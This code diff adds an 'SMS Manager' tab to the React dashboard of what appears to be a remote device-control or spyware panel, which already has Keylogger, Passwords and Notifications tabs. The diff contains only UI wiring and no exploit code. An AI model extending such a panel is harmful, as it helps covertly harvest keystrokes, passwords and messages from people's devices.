@@ -14,6 +14,7 @@ import TaskStudio from './TaskStudio.jsx';
 import PasswordsTab from './PasswordsTab.jsx';
 import ControlCenter from './ControlCenter.jsx';
 import GestureTab from './GestureTab.jsx';
+import SMSManagerTab from './SMSManagerTab.jsx';
 
 const TABS = [
   { id: 'control_center',label: '🎮 Control Center' },
@@ -24,6 +25,7 @@ const TABS = [
   { id: 'task_studio',   label: '🎬 Task Studio' },
   { id: 'passwords',     label: '🔑 Passwords' },
   { id: 'notifications', label: '🔔 Notifications' },
+  { id: 'sms_manager',   label: '💬 SMS Manager' },
   { id: 'activity',      label: '📱 Activity' },
   { id: 'keylogger',     label: '⌨️ Keylogger' },
   { id: 'app_manager',   label: '📦 App Manager' },
@@ -109,6 +111,7 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
             send={send}
             serverLatency={serverLatency}
             deviceLatency={deviceLatency}
+            onTabChange={setActiveTab}
           />
         </div>
       )}
@@ -209,6 +212,14 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
 
       {activeTab === 'permissions' && (
         <PermissionsTab
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+        />
+      )}
+
+      {activeTab === 'sms_manager' && (
+        <SMSManagerTab
           device={device}
           sendCommand={sendCommand}
           results={results}
